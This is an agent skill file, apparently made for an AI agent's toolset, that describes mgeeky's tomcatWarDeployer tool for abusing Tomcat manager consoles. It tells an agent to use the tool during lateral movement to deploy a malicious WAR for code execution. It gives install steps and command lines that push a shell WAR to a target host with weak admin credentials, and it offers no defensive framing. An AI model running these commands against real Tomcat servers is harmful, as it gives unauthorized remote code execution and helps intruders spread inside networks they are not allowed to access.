---
name: tomcatwardeployer
description: "tomcatWarDeployer exploits Tomcat admin consoles. Signals: lateral movement, psexec, Tomcat deployment, WAR generation"
zh-signals: "tomcatWarDeployer: Tomcat 管理后台利用。信号:横向移动,psexec,Tomcat 部署,生成 WAR。"
when-to-use: >-
  Use when you have Tomcat manager credentials and want to deploy a malicious
  WAR for code execution, or generate a WAR payload. Useful during lateral
  movement against exposed Tomcat consoles.
---

# tomcatWarDeployer

- Attack Category: C31 Remote Service Lateral Movement
- Upstream Repository: https://github.com/mgeeky/tomcatWarDeployer
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer && cd tomcatWarDeployer
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 tomcatWarDeployer.py -H 10.0.0.5 -p 8080 -U admin -P pass -W shell.war` | Tomcat deployment |
| `-H host -p port -c 'cmd'` | Command |
| `-g` | Generate WAR |

## Attack Scenario Playbook

### Tomcat admin console exploitation

```bash
python3 tomcatWarDeployer.py -H 10.0.0.5 -U admin -P pass -g
# Weak credentials + WAR deployment
```

## Notes

From mgeeky; automates Tomcat deployment.
